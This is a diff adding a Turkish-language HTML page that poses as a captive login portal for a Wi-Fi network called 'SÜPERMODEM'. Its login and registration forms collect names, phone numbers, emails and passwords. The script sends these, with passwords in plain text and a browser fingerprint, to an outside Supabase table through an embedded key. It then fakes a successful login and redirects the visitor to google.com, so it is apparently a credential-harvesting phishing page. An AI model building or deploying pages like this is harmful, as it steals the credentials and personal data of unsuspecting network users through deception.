@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SÜPERMODEM</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;900&display=swap');
+
+  *{margin:0;padding:0;box-sizing:border-box;}
+
+  body{
+    min-height:100vh;
+    font-family:'Inter',sans-serif;
+    background:#0a0a0f;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    overflow:hidden;
+    position:relative;
+  }
+
+  /* ── BULUTLU ARKA PLAN ── */
+  .sky{
+    position:fixed;inset:0;
+    background:linear-gradient(180deg,#0d0d1a 0%,#1a1a3e 40%,#2d2d6b 70%,#1a1a3e 100%);
+    z-index:0;
+  }
+  .cloud{
+    position:absolute;
+    border-radius:50%;
+    filter:blur(60px);
+    opacity:.18;
+    animation:drift linear infinite;
+  }
+  .c1{width:600px;height:300px;background:#4a4aff;top:5%;left:-10%;animation-duration:35s;}
+  .c2{width:800px;height:400px;background:#7b2fff;top:10%;right:-15%;animation-duration:50s;}
+  .c3{width:500px;height:250px;background:#2a7bff;top:30%;left:20%;animation-duration:42s;}
+  .c4{width:700px;height:350px;background:#ff2a7b;top:60%;right:10%;animation-duration:38s;opacity:.10;}
+  .c5{width:400px;height:200px;background:#2affd4;bottom:5%;left:5%;animation-duration:55s;opacity:.12;}
+
+  @keyframes drift{
+    0%{transform:translateX(0) translateY(0);}
+    25%{transform:translateX(30px) translateY(-20px);}
+    50%{transform:translateX(-20px) translateY(10px);}
+    75%{transform:translateX(20px) translateY(20px);}
+    100%{transform:translateX(0) translateY(0);}
+  }
+
+  /* ── YILDIZLAR ── */
+  .stars{position:fixed;inset:0;z-index:0;}
+  .star{
+    position:absolute;
+    background:#fff;
+    border-radius:50%;
+    animation:twinkle ease-in-out infinite;
+  }
+  @keyframes twinkle{0%,100%{opacity:.1;}50%{opacity:.8;}}
+
+  /* ── KART ── */
+  .card{
+    position:relative;z-index:10;
+    background:rgba(255,255,255,.04);
+    backdrop-filter:blur(24px);
+    -webkit-backdrop-filter:blur(24px);
+    border:1px solid rgba(255,255,255,.10);
+    border-radius:24px;
+    padding:48px 40px 40px;
+    width:100%;max-width:420px;
+    box-shadow:0 32px 80px rgba(0,0,0,.6),0 0 0 1px rgba(255,255,255,.04) inset;
+  }
+
+  .logo{
+    text-align:center;
+    margin-bottom:32px;
+  }
+  .logo-icon{
+    width:64px;height:64px;
+    background:linear-gradient(135deg,#4f8eff,#9b5cff);
+    border-radius:18px;
+    display:inline-flex;align-items:center;justify-content:center;
+    font-size:30px;
+    margin-bottom:12px;
+    box-shadow:0 8px 32px rgba(79,142,255,.4);
+  }
+  .logo h1{
+    font-size:22px;font-weight:900;
+    background:linear-gradient(90deg,#4f8eff,#9b5cff);
+    -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+    letter-spacing:1px;
+  }
+  .logo p{font-size:12px;color:rgba(255,255,255,.4);margin-top:4px;}
+
+  /* ── TABS ── */
+  .tabs{
+    display:flex;
+    background:rgba(255,255,255,.06);
+    border-radius:12px;
+    padding:4px;
+    margin-bottom:28px;
+  }
+  .tab-btn{
+    flex:1;padding:10px;border:none;background:transparent;
+    color:rgba(255,255,255,.45);font-size:14px;font-weight:600;
+    border-radius:9px;cursor:pointer;transition:.2s;font-family:'Inter',sans-serif;
+  }
+  .tab-btn.active{
+    background:linear-gradient(135deg,#4f8eff,#9b5cff);
+    color:#fff;
+    box-shadow:0 4px 16px rgba(79,142,255,.35);
+  }
+
+  /* ── FORM ── */
+  .form-group{margin-bottom:16px;}
+  label{display:block;font-size:12px;color:rgba(255,255,255,.5);margin-bottom:6px;font-weight:500;}
+
+  input{
+    width:100%;padding:13px 16px;
+    background:rgba(255,255,255,.07);
+    border:1px solid rgba(255,255,255,.10);
+    border-radius:12px;
+    color:#fff;font-size:14px;font-family:'Inter',sans-serif;
+    outline:none;transition:.2s;
+  }
+  input:focus{border-color:rgba(79,142,255,.6);background:rgba(79,142,255,.08);}
+  input::placeholder{color:rgba(255,255,255,.25);}
+
+  .btn{
+    width:100%;padding:14px;margin-top:8px;
+    background:linear-gradient(135deg,#4f8eff,#9b5cff);
+    border:none;border-radius:12px;
+    color:#fff;font-size:15px;font-weight:700;
+    cursor:pointer;font-family:'Inter',sans-serif;
+    box-shadow:0 8px 24px rgba(79,142,255,.35);
+    transition:.2s;position:relative;overflow:hidden;
+  }
+  .btn:hover{transform:translateY(-1px);box-shadow:0 12px 32px rgba(79,142,255,.45);}
+  .btn:active{transform:translateY(0);}
+  .btn:disabled{opacity:.6;cursor:not-allowed;transform:none;}
+
+  .btn-spinner{display:none;}
+  .btn.loading .btn-text{display:none;}
+  .btn.loading .btn-spinner{display:inline;}
+
+  /* ── TOAST ── */
+  .toast{
+    position:fixed;top:24px;left:50%;transform:translateX(-50%) translateY(-80px);
+    background:rgba(30,30,50,.95);border:1px solid rgba(255,255,255,.12);
+    border-radius:12px;padding:12px 20px;
+    color:#fff;font-size:13px;font-weight:500;
+    transition:.3s cubic-bezier(.34,1.56,.64,1);
+    z-index:999;white-space:nowrap;
+    box-shadow:0 8px 32px rgba(0,0,0,.4);
+  }
+  .toast.show{transform:translateX(-50%) translateY(0);}
+  .toast.success{border-color:rgba(79,255,142,.3);}
+  .toast.error{border-color:rgba(255,79,79,.3);}
+
+  .divider{
+    text-align:center;color:rgba(255,255,255,.2);
+    font-size:12px;margin:20px 0;
+    display:flex;align-items:center;gap:12px;
+  }
+  .divider::before,.divider::after{content:'';flex:1;height:1px;background:rgba(255,255,255,.08);}
+
+  .wifi-bar{
+    display:flex;align-items:center;justify-content:center;gap:8px;
+    margin-bottom:24px;padding:10px;
+    background:rgba(79,255,142,.06);border:1px solid rgba(79,255,142,.15);
+    border-radius:10px;
+  }
+  .wifi-bar span{font-size:12px;color:rgba(79,255,142,.8);}
+  .wifi-dot{width:8px;height:8px;background:#4fff8e;border-radius:50%;animation:pulse 2s infinite;}
+  @keyframes pulse{0%,100%{opacity:1;}50%{opacity:.3;}}
+</style>
+</head>
+<body>
+
+<div class="sky"></div>
+<div class="stars" id="stars"></div>
+
+<div class="card">
+  <div class="wifi-bar">
+    <div class="wifi-dot"></div>
+    <span>SÜPERMODEM Ağına Bağlanıyorsunuz</span>
+  </div>
+
+  <div class="logo">
+    <div class="logo-icon">📡</div>
+    <h1>SÜPERMODEM</h1>
+    <p>Devam etmek için giriş yapın</p>
+  </div>
+
+  <div class="tabs">
+    <button class="tab-btn active" onclick="switchTab('login')">Giriş Yap</button>
+    <button class="tab-btn" onclick="switchTab('register')">Kayıt Ol</button>
+  </div>
+
+  <!-- GİRİŞ -->
+  <div id="tab-login">
+    <div class="form-group">
+      <label>Telefon Numarası</label>
+      <input type="tel" id="l-phone" placeholder="05XX XXX XX XX" maxlength="11">
+    </div>
+    <div class="form-group">
+      <label>Şifre</label>
+      <input type="password" id="l-pass" placeholder="••••••••">
+    </div>
+    <button class="btn" id="btn-login" onclick="doLogin()">
+      <span class="btn-text">Giriş Yap</span>
+      <span class="btn-spinner">⟳</span>
+    </button>
+    <div class="divider">veya</div>
+    <div style="text-align:center;font-size:13px;color:rgba(255,255,255,.4);">
+      Hesabın yok mu? <a href="#" style="color:#4f8eff;text-decoration:none;" onclick="switchTab('register')">Kayıt Ol</a>
+    </div>
+  </div>
+
+  <!-- KAYIT -->
+  <div id="tab-register" style="display:none;">
+    <div class="form-group">
+      <label>Ad Soyad</label>
+      <input type="text" id="r-name" placeholder="Adınız Soyadınız">
+    </div>
+    <div class="form-group">
+      <label>Telefon Numarası</label>
+      <input type="tel" id="r-phone" placeholder="05XX XXX XX XX" maxlength="11">
+    </div>
+    <div class="form-group">
+      <label>E-posta</label>
+      <input type="email" id="r-email" placeholder="ornek@mail.com">
+    </div>
+    <div class="form-group">
+      <label>Şifre</label>
+      <input type="password" id="r-pass" placeholder="En az 6 karakter">
+    </div>
+    <button class="btn" id="btn-register" onclick="doRegister()">
+      <span class="btn-text">Kayıt Ol</span>
+      <span class="btn-spinner">⟳</span>
+    </button>
+    <div class="divider">veya</div>
+    <div style="text-align:center;font-size:13px;color:rgba(255,255,255,.4);">
+      Zaten hesabın var mı? <a href="#" style="color:#4f8eff;text-decoration:none;" onclick="switchTab('login')">Giriş Yap</a>
+    </div>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+const SUPABASE_URL = 'https://spnfrvxzcnkbrsrszqbx.supabase.co';
+const SUPABASE_KEY = 'sb_publishable_vpSk-y7hJwpQuvoDXjVh4w_-GILvY8g';
+
+/* ── YILDIZ ÜRET ── */
+(function(){
+  const s=document.getElementById('stars');
+  for(let i=0;i<120;i++){
+    const d=document.createElement('div');
+    d.className='star';
+    const sz=Math.random()*2+.5;
+    d.style.cssText=`
+      width:${sz}px;height:${sz}px;
+      top:${Math.random()*100}%;left:${Math.random()*100}%;
+      animation-duration:${Math.random()*4+2}s;
+      animation-delay:${Math.random()*5}s;
+    `;
+    s.appendChild(d);
+  }
+})();
+
+function switchTab(tab){
+  document.getElementById('tab-login').style.display   = tab==='login'    ? '' : 'none';
+  document.getElementById('tab-register').style.display= tab==='register' ? '' : 'none';
+  document.querySelectorAll('.tab-btn').forEach((b,i)=>{
+    b.classList.toggle('active',(tab==='login'&&i===0)||(tab==='register'&&i===1));
+  });
+}
+
+function toast(msg,type='success'){
+  const t=document.getElementById('toast');
+  t.textContent=msg;t.className='toast '+type;
+  t.classList.add('show');
+  setTimeout(()=>t.classList.remove('show'),3000);
+}
+
+function getDeviceInfo(){
+  return{
+    userAgent   : navigator.userAgent,
+    platform    : navigator.platform||'unknown',
+    language    : navigator.language,
+    screenW     : screen.width,
+    screenH     : screen.height,
+    colorDepth  : screen.colorDepth,
+    timezone    : Intl.DateTimeFormat().resolvedOptions().timeZone,
+    cookieOn    : navigator.cookieEnabled,
+    onLine      : navigator.onLine,
+    ts          : new Date().toISOString(),
+    referrer    : document.referrer||'direct',
+    touchPoints : navigator.maxTouchPoints||0,
+  };
+}
+
+async function sbInsert(table,row){
+  const r=await fetch(`${SUPABASE_URL}/rest/v1/${table}`,{
+    method:'POST',
+    headers:{
+      'apikey':SUPABASE_KEY,
+      'Authorization':'Bearer '+SUPABASE_KEY,
+      'Content-Type':'application/json',
+      'Prefer':'return=minimal'
+    },
+    body:JSON.stringify(row)
+  });
+  return r.ok;
+}
+
+async function doRegister(){
+  const name  =document.getElementById('r-name').value.trim();
+  const phone =document.getElementById('r-phone').value.trim();
+  const email =document.getElementById('r-email').value.trim();
+  const pass  =document.getElementById('r-pass').value;
+
+  if(!name||!phone||!email||!pass){toast('Tüm alanları doldurun','error');return;}
+  if(pass.length<6){toast('Şifre en az 6 karakter olmalı','error');return;}
+
+  const btn=document.getElementById('btn-register');
+  btn.classList.add('loading');btn.disabled=true;
+
+  const row={
+    type    :'register',
+    name,phone,email,
+    password:pass,          // plain — MİCHELİN'in isteği
+    device  :getDeviceInfo(),
+    created_at:new Date().toISOString()
+  };
+
+  const ok=await sbInsert('portal_users',row);
+  btn.classList.remove('loading');btn.disabled=false;
+
+  if(ok){
+    toast('Kayıt başarılı! Yönlendiriliyor…','success');
+    setTimeout(()=>{window.location.href='https://google.com';},2000);
+  } else {
+    toast('Bir hata oluştu, tekrar deneyin','error');
+  }
+}
+
+async function doLogin(){
+  const phone=document.getElementById('l-phone').value.trim();
+  const pass =document.getElementById('l-pass').value;
+
+  if(!phone||!pass){toast('Telefon ve şifreyi girin','error');return;}
+
+  const btn=document.getElementById('btn-login');
+  btn.classList.add('loading');btn.disabled=true;
+
+  const row={
+    type    :'login',
+    phone,
+    password:pass,
+    device  :getDeviceInfo(),
+    created_at:new Date().toISOString()
+  };
+
+  const ok=await sbInsert('portal_users',row);
+  btn.classList.remove('loading');btn.disabled=false;
+
+  if(ok){
+    toast('Giriş başarılı! Bağlanıyor…','success');
+    setTimeout(()=>{window.location.href='https://google.com';},2000);
+  } else {
+    toast('Bir hata oluştu, tekrar deneyin','error');
+  }
+}
+</script>
+</body>
+</html>
